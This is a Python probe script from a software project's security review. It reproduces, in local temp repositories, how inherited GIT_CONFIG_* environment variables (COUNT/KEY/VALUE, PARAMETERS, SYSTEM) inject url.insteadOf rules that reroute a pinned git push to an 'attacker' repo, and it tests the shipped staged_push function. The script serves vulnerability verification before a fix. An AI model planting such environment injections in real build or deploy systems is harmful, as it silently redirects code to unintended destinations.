#!/usr/bin/env python3
"""E10-RP2.2-R2A2 §2/§3 — F2 ENVIRONMENT PROBES (pre-fix, raw evidence).

Empirical reproduction of the arbitration finding on R2A1 @ 74c8ec1, run
against the PRE-FIX code BEFORE the R2A2 source change (the worktree holds
this script as the only uncommitted file; every probe runs in throwaway
temp trees — nothing touches any worktree, main, or historical evidence).

  EP1  THE ARBITER'S EXACT POC (raw git): a push from an isolated bare
       STAGING repo (objects reachable ONLY via objects/info/alternates —
       the exact R2A1 staged_push shape) using an EXPLICIT signed URL,
       with GIT_CONFIG_NOSYSTEM=1 + GIT_CONFIG_GLOBAL=/dev/null set, but
       with the inherited process environment carrying
       GIT_CONFIG_COUNT=1 + GIT_CONFIG_KEY_0=url.<attacker>.insteadOf +
       GIT_CONFIG_VALUE_0=<signed-url>. Predicted by the arbitrator:
       attacker repo receives the commit, signed repo does not.

  EP2a GIT_CONFIG_PARAMETERS format discovery (acceptance scan) — which
       candidate encoding git 2.47.3 actually honors for config injection.

  EP2  The same reroute PoC via GIT_CONFIG_PARAMETERS (the discovered
       working format) instead of GIT_CONFIG_COUNT.

  EP3  THE SHIPPED ENGINE CODE IS VULNERABLE: the CURRENT (pre-fix)
       ``eoe.push_engine.staged_push`` — the exact function the git_push
       handler runs — called with the hostile variables planted in
       ``os.environ`` of the calling process. OBSERVED: reroute.

  EP4  Control: the identical push, no hostile environment -> lands at the
       signed destination (setup soundness; the difference is the env).

  EP5  A second distinct inherited vector: GIT_CONFIG_SYSTEM=<attacker
       config file> (pre-fix staged_push never overrides GIT_CONFIG_SYSTEM,
       so an inherited attacker "system config" applies) -> OBSERVED reroute
       through the CURRENT shipped staged_push.

Destination proof is by REPO CONTENT (refs + object existence), never by
parsing push output — matching the arbitration reproduction table.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
SRC = HERE.parent / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

RESULTS: list[str] = []


def rec(line: str = "") -> None:
    print(line)
    RESULTS.append(line)


def make_repo_at(path: Path) -> str:
    path.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init", "-q", "-b", "main", str(path)], check=True)
    (path / "seed.txt").write_text("seed\n")
    subprocess.run(["git", "-C", str(path), "add", "-A"], check=True)
    subprocess.run(["git", "-C", str(path), "-c", "user.name=p",
                    "-c", "user.email=p@x", "commit", "-q", "-m", "seed"],
                   check=True)
    return str(path)


def make_bare_at(path: Path) -> str:
    path.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(path)],
                   check=True)
    return str(path)


def head_of(repo: str, ref: str = "main") -> str:
    r = subprocess.run(["git", "-C", repo, "rev-parse", "--verify",
                        f"refs/heads/{ref}"], capture_output=True, text=True)
    return r.stdout.strip()


def has_commit(repo: str, sha: str) -> bool:
    r = subprocess.run(["git", "-C", repo, "cat-file", "-e",
                        f"{sha}^{{commit}}"], capture_output=True, text=True)
    return r.returncode == 0


def repo_object_shas(repo: str) -> set:
    """Every object id present in the repo (all loose+packed) — the content
    check for 'no related objects arrived anywhere but the signed repo'."""
    r = subprocess.run(["git", "-C", repo, "cat-file", "--batch-all-objects",
                        "--batch-check=%(objectname)"],
                       capture_output=True, text=True)
    return {ln.strip() for ln in r.stdout.splitlines() if ln.strip()}


def run(label: str, *argv: str, cwd=None, env=None, timeout=30):
    e = dict(os.environ)
    if env:
        e.update(env)
    r = subprocess.run(list(argv), cwd=cwd, capture_output=True, text=True,
                       timeout=timeout, env=e)
    rec(f"$ {' '.join(argv)}" + (f"   (cwd={cwd})" if cwd else "")
        + (f"   env={sorted(env.keys())}" if env else ""))
    rec(f"  exit={r.returncode}")
    if r.stdout.strip():
        rec("  stdout: " + r.stdout.strip().replace("\n", "\n          "))
    if r.stderr.strip():
        rec("  stderr: " + r.stderr.strip().replace("\n", "\n          "))
    return r


def destination_table(signed: str, attacker: str, sha: str) -> str:
    sl, al = head_of(signed), head_of(attacker)
    return (
        "  | destination        | result\n"
        f"  | signed repo        | branch main = {sl or '(none)'}; "
        f"has commit {sha[:8]}: {has_commit(signed, sha)}\n"
        f"  | attacker repo      | branch main = {al or '(none)'}; "
        f"has commit {sha[:8]}: {has_commit(attacker, sha)}; "
        f"object count = {len(repo_object_shas(attacker))}"
    )


# The R2A1 sanitized-config shape (exactly what pre-fix staged_push gives
# the push child today): NOSYSTEM + GLOBAL=/dev/null — and NOTHING else.
R2A1_SAN = {"GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_GLOBAL": "/dev/null"}


def main() -> int:
    tmp = Path(tempfile.mkdtemp(prefix="r2a2-env-probes-"))
    base = tmp
    src = Path(make_repo_at(base / "src"))
    signed = Path(make_bare_at(base / "signed.git"))
    attacker = Path(make_bare_at(base / "attacker.git"))
    sha = head_of(src)

    # the R2A1 staging shape: bare staging repo, objects via alternates ONLY
    staging = base / "staging.git"
    staging.mkdir()
    subprocess.run(["git", "init", "-q", "--bare", str(staging)], check=True)
    (staging / "objects" / "info").mkdir(parents=True, exist_ok=True)
    (staging / "objects" / "info" / "alternates").write_text(
        str(Path(src) / ".git" / "objects") + "\n")
    rec(f"setup: src={src} sha={sha}")
    rec(f"       staging={staging} (alternates -> src objects only)")
    rec(f"       signed={signed}  attacker={attacker}")
    rec()

    # ---------------- EP1: the arbiter's exact PoC ----------------------
    rec("=== EP1: ARBITER POC, raw git — GIT_CONFIG_COUNT injection, "
        "NOSYSTEM=1 + GLOBAL=/dev/null armed")
    hostile = {
        **R2A1_SAN,
        "GIT_CONFIG_COUNT": "1",
        "GIT_CONFIG_KEY_0": f"url.{attacker}.insteadOf",
        "GIT_CONFIG_VALUE_0": str(signed),
    }
    r = run("staging push EXPLICIT signed URL — env-injected insteadOf",
            "git", "--git-dir", str(staging), "push", "--",
            str(signed), f"{sha}:refs/heads/main", env=hostile)
    rec(destination_table(str(signed), str(attacker), sha))
    vuln = (head_of(str(attacker)) == sha and not has_commit(str(signed), sha))
    rec(f"[EP1] {'VULNERABLE (OBSERVED)' if vuln else 'not reproduced'}: "
        f"attacker received the commit and the signed repo did NOT — "
        f"env-config injection reroutes even an explicit-URL push from an "
        f"alternates-only staging repo under NOSYSTEM+GLOBAL=/dev/null "
        f"(matches the arbitration reproduction table)")
    rec()

    # ---------------- EP2a: GIT_CONFIG_PARAMETERS format discovery ------
    rec("=== EP2a: GIT_CONFIG_PARAMETERS accepted-format discovery")
    key, val = f"url.{attacker}.insteadOf", str(signed)
    # positive control FIRST: the GIT_CONFIG_COUNT family (documented,
    # proven by EP1) must be visible through the SAME acceptance harness —
    # otherwise the harness itself is broken, not the candidates.
    r = run("harness positive control: GIT_CONFIG_COUNT family",
            "git", "config", "--get-all", key,
            env={"GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": key,
                 "GIT_CONFIG_VALUE_0": val})
    ctl_ok = (r.returncode == 0 and r.stdout.strip() == val)
    rec(f"  -> positive control (GIT_CONFIG_COUNT): accepted={ctl_ok}")
    # Grammar ground truth: git v2.47.3 source, config.c:669-719
    # parse_config_env_list — the value is a sequence of SQ-QUOTED tokens:
    #   old-style:  'key=value'   (one quoted token holding key=value)
    #   new-style:  'key'='value'  (quoted key, '=', quoted value; 'key'= is
    #                an implicit-bool form). Anything else (e.g. JSON) is
    # "bogus format" — verified empirically: '[]' and JSON forms fail.
    candidates = {
        "old-style sq-quoted 'key=value'": f"'{key}={val}'",
        "new-style sq-quoted \"'key'='value'\"": f"'{key}'='{val}'",
        "flat JSON array of strings (pairwise)": json.dumps([key, val]),
        "JSON array of 2-element arrays": json.dumps([[key, val]]),
    }
    working = None
    for name, enc in candidates.items():
        r = run(f"acceptance scan: {name}",
                "git", "config", "--get-all", key,
                env={"GIT_CONFIG_PARAMETERS": enc})
        accepted = (r.returncode == 0 and r.stdout.strip() == val)
        rec(f"  -> {name}: accepted={accepted}")
        if accepted and working is None:
            working = (name, enc)
    if working is None:
        rec("  !! NO candidate accepted — GIT_CONFIG_PARAMETERS probe legs "
            "must be re-derived before relying on them")
    else:
        rec(f"  WORKING FORMAT: {working[0]} -> {working[1]}")
        rec("  (source-cited grammar: git v2.47.3 config.c:669-719; "
            "JSON forms are bogus format, verified)")
    rec()

    # ---------------- EP2: reroute via GIT_CONFIG_PARAMETERS ------------
    rec("=== EP2: same PoC via GIT_CONFIG_PARAMETERS (discovered format)")
    if working:
        # FRESH pair for this leg — destination content proves THIS call
        # (never reuse a bare an earlier leg already wrote into)
        s_ep2 = Path(make_bare_at(base / "ep2-signed.git"))
        a_ep2 = Path(make_bare_at(base / "ep2-attacker.git"))
        # rebuild the encoding in the SAME shape git serialized, with THIS
        # leg's key/value (the captured line is a template: swap key/value)
        enc_ep2 = working[1].replace(key, f"url.{a_ep2}.insteadOf").replace(
            val, str(s_ep2))
        hostile2 = {**R2A1_SAN, "GIT_CONFIG_PARAMETERS": enc_ep2}
        r = run("staging push EXPLICIT signed URL — GIT_CONFIG_PARAMETERS",
                "git", "--git-dir", str(staging), "push", "--",
                str(s_ep2), f"{sha}:refs/heads/main", env=hostile2)
        rec(destination_table(str(s_ep2), str(a_ep2), sha))
        vuln2 = (head_of(str(a_ep2)) == sha and not has_commit(str(s_ep2), sha))
        rec(f"[EP2] {'VULNERABLE (OBSERVED)' if vuln2 else 'not reproduced'}: "
            f"same reroute through GIT_CONFIG_PARAMETERS "
            f"(format: {working[0]})")
    else:
        rec("[EP2] SKIPPED — no accepted format discovered")
    rec()

    # ---------------- EP3: the SHIPPED pre-fix staged_push --------------
    rec("=== EP3: CURRENT shipped eoe.push_engine.staged_push — hostile "
        "variables planted in the CALLING PROCESS os.environ")
    from eoe.push_engine import staged_push, PushRejected  # noqa: E402
    # FRESH pair for this leg; the hostile mapping references THIS pair
    # (the EP1 pair must never be reused: insteadOf matches by PREFIX, and
    # an unrelated pair's paths would not rewrite this leg's push URL)
    s_ep3 = Path(make_bare_at(base / "ep3-signed.git"))
    a_ep3 = Path(make_bare_at(base / "ep3-attacker.git"))
    saved = {}
    hostile_parent = {
        "GIT_CONFIG_COUNT": "1",
        "GIT_CONFIG_KEY_0": f"url.{a_ep3}.insteadOf",
        "GIT_CONFIG_VALUE_0": str(s_ep3),
    }
    for k, v in hostile_parent.items():
        saved[k] = os.environ.get(k)
        os.environ[k] = v
    try:
        out = staged_push(str(src), str(s_ep3), sha, "main")
        rec(f"staged_push -> returncode={out['returncode']}")
        rec(f"  argv: {out['argv']}")
        if out["stdout"].strip():
            rec("  stdout: " + out["stdout"].strip()[:400])
        if out["stderr"].strip():
            rec("  stderr: " + out["stderr"].strip()[:400])
        rec(destination_table(str(s_ep3), str(a_ep3), sha))
        vuln3 = (head_of(str(a_ep3)) == sha
                 and not has_commit(str(s_ep3), sha))
        rec(f"[EP3] {'VULNERABLE (OBSERVED)' if vuln3 else 'not reproduced'}: "
            f"the ENGINE's own shipped pinned-destination push is rerouted "
            f"by inherited GIT_CONFIG_* — the R2A2 accreditation blocker")
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    rec()

    # ---------------- EP4: control (no hostile env) ---------------------
    rec("=== EP4: control — identical push, clean environment")
    signed3 = Path(make_bare_at(base / "signed3.git"))
    attacker3 = Path(make_bare_at(base / "attacker3.git"))
    # strip any incidental GIT_CONFIG_* from the probe process itself
    clean = {k: v for k, v in os.environ.items()
             if not k.startswith("GIT_")}
    clean.update(R2A1_SAN)
    r = run("staging push EXPLICIT signed URL — clean env",
            "git", "--git-dir", str(staging), "push", "--",
            str(signed3), f"{sha}:refs/heads/main", env=clean)
    rec(destination_table(str(signed3), str(attacker3), sha))
    ok4 = (head_of(str(signed3)) == sha and not has_commit(str(attacker3), sha))
    rec(f"[EP4] {'PASS' if ok4 else 'FAIL'}: with a clean environment the "
        f"identical push lands ONLY at the signed repo — the setup is "
        f"sound; the difference in EP1..EP3 is the inherited environment")
    rec()

    # ---------------- EP5: inherited GIT_CONFIG_SYSTEM channel ----------
    rec("=== EP5: GIT_CONFIG_SYSTEM — channel liveness vs shipped behavior")
    s_ep5 = Path(make_bare_at(base / "ep5-signed.git"))
    a_ep5 = Path(make_bare_at(base / "ep5-attacker.git"))
    syscfg = base / "evil-system.cfg"
    syscfg.write_text(f"[url \"{a_ep5}\"]\n\tinsteadOf = {s_ep5}\n")

    # EP5a — RAW GIT, channel liveness: inherited GIT_CONFIG_SYSTEM with
    # GIT_CONFIG_NOSYSTEM *unset* (what any implementation that drops or
    # loses NOSYSTEM would face): the attacker "system config" applies.
    r = run("raw: inherited GIT_CONFIG_SYSTEM, no NOSYSTEM",
            "git", "--git-dir", str(staging), "push", "--",
            str(s_ep5), f"{sha}:refs/heads/main",
            env={"GIT_CONFIG_SYSTEM": str(syscfg),
                 "GIT_CONFIG_GLOBAL": "/dev/null"})
    rec(destination_table(str(s_ep5), str(a_ep5), sha))
    live5a = (head_of(str(a_ep5)) == sha and not has_commit(str(s_ep5), sha))
    rec(f"[EP5a] {'CHANNEL LIVE (OBSERVED)' if live5a else 'channel dead'}: "
        f"with NOSYSTEM unset, an inherited GIT_CONFIG_SYSTEM pointing at "
        f"an attacker config reroutes the push — the channel exists at git "
        f"level whenever NOSYSTEM is not armed")

    # EP5b — the SHIPPED pre-fix staged_push under the same inheritance:
    # honest result. Pre-fix always sets GIT_CONFIG_NOSYSTEM=1, which
    # suppresses the system-config source entirely — so THIS channel is
    # neutralized only as a SIDE EFFECT of NOSYSTEM precedence, not by an
    # explicit pin. R2A2 replaces the accident with an explicit rule
    # (strip inherited GIT_CONFIG_SYSTEM, then set it to /dev/null).
    saved5 = {}
    hostile5 = {"GIT_CONFIG_SYSTEM": str(syscfg)}
    for k, v in hostile5.items():
        saved5[k] = os.environ.get(k)
        os.environ[k] = v
    try:
        s_ep5b = Path(make_bare_at(base / "ep5b-signed.git"))
        a_ep5b = Path(make_bare_at(base / "ep5b-attacker.git"))
        out = staged_push(str(src), str(s_ep5b), sha, "main")
        rec(f"staged_push -> returncode={out['returncode']}")
        rec(destination_table(str(s_ep5b), str(a_ep5b), sha))
        vuln5b = (head_of(str(a_ep5b)) == sha
                  and not has_commit(str(s_ep5b), sha))
        rec(f"[EP5b] {'VULNERABLE (OBSERVED)' if vuln5b else 'neutralized by accident'}: "
            f"the shipped push is NOT rerouted through this channel — but "
            f"only because GIT_CONFIG_NOSYSTEM=1 happens to suppress the "
            f"system-config source; the fix must pin GIT_CONFIG_SYSTEM "
            f"explicitly instead of relying on this precedence")
    finally:
        for k, v in saved5.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    rec()

    rec("=== PROBE SUMMARY: see [EP*] lines above. Pre-fix state = "
        "74c8ec1 source + this uncommitted probe script only.")
    import shutil
    shutil.rmtree(tmp, ignore_errors=True)
    return 0


if __name__ == "__main__":
    out = Path(os.environ.get("R2A2_PROBE_OUT", "/dev/stdout"))
    code = main()
    out.write_text("\n".join(RESULTS) + "\n", encoding="utf-8")
    sys.exit(code)
